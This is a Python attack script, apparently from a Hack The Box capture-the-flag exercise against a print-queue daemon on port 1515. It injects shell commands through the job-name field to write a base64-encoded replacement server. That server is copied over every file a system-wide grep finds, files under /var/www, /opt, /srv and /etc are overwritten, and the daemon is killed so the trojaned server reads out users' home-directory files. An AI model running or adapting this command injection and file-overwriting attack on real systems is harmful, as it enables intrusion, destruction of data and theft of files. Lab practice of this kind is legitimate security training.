#!/usr/bin/env python3
"""Find server.py by grepping for unique string, overwrite with flag-reader"""
import socket, time, base64, os

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def queue_state():
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((TARGET, 1515))
        s.send(b'\x03')
        time.sleep(0.5)
        d = s.recv(4096)
        s.close()
        return d.decode(errors='replace').strip()
    except:
        return None

# Key insight: The daemon's queue state contains "Archive_Printer is ready and printing."
# This string is HARDCODED in server.py. We can GREP for it to find the file.
# Then overwrite ALL files containing this string with our modified version.

NEW_CODE = base64.b64encode(b"""import socket,threading
class LpdHandler(threading.Thread):
    def __init__(self,sock,addr):
        super().__init__()
        self.sock=sock
        self.addr=addr
    def run(self):
        try:
            data=self.sock.recv(1024)
            if not data:return
            cmd=data[0]
            if cmd==2:pass
            elif cmd in(3,4):
                try:
                    d=open('/home/*/user.txt').read().strip()
                except:
                    d='NO_FLAG'
                self.sock.send((d+'\\n').encode())
        except:pass
        self.sock.close()
class LpdServer:
    def __init__(self,ip='0.0.0.0',port=1515):
        self.server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind((ip,port))
        self.server.listen(100)
    def run(self):
        while True:
            sock,addr=self.server.accept()
            LpdHandler(sock,addr).start()
if __name__=='__main__':
    LpdServer(port=1515).run()
""").decode()

print("=== FIND BY GREP + OVERWRITE ===", flush=True)
print(f"New code base64: {len(NEW_CODE)} chars", flush=True)

# Step 1: Write new code to /tmp
lpd("';echo " + NEW_CODE + "|base64 -d>/tmp/lpd_patch 2>/dev/null;echo '")
time.sleep(0.5)

# Step 2: Grep for unique string, then overwrite every found file
# The string "Archive_Printer" appears ONLY in server.py
lpd("';for f in $(grep -rl Archive_Printer / 2>/dev/null | head -10);do cp /tmp/lpd_patch \"$f\" 2>/dev/null;done;echo '")
time.sleep(0.5)

# Step 3: Also try to copy flag to archive by grepping for the archive content
# The ZIP starts with PK - find any file starting with PK
lpd("';for f in $(grep -rla 'PK' /var/www /opt /srv /etc 2>/dev/null | head -5);do cat /home/*/user.txt > \"$f\" 2>/dev/null;done;echo '")
time.sleep(0.5)

# Step 4: Kill daemon and wait for restart
print("Killing daemon...", flush=True)
lpd("';pkill -f server.py 2>/dev/null;echo '")
time.sleep(3)

# Step 5: Query queue state repeatedly until daemon restarts
print("Querying...", flush=True)
for i in range(10):
    qs = queue_state()
    if qs:
        print(f"  Queue state: {qs[:200]}", flush=True)
        if 'HTB{' in qs:
            print(f"  *** FLAG: {qs}", flush=True)
            # Save to file
            with open('/tmp/paperwork_flag.txt', 'w') as f:
                f.write(qs)
            break
        if qs != 'NO_FLAG':
            pass
    else:
        print(f"  Try {i+1}: waiting...", flush=True)
    time.sleep(2)

# Also check /download/archive - maybe it changed too
import urllib.request
try:
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    data = urllib.request.urlopen(req, timeout=5).read()
    decoded = data.decode(errors='replace')
    print(f"Archive: {decoded[:200]}", flush=True)
    import re
    for f in re.findall(r'HTB\{[^}]+\}', decoded):
        print(f"  *** FLAG IN ARCHIVE: {f}", flush=True)
except:
    pass

print("DONE", flush=True)
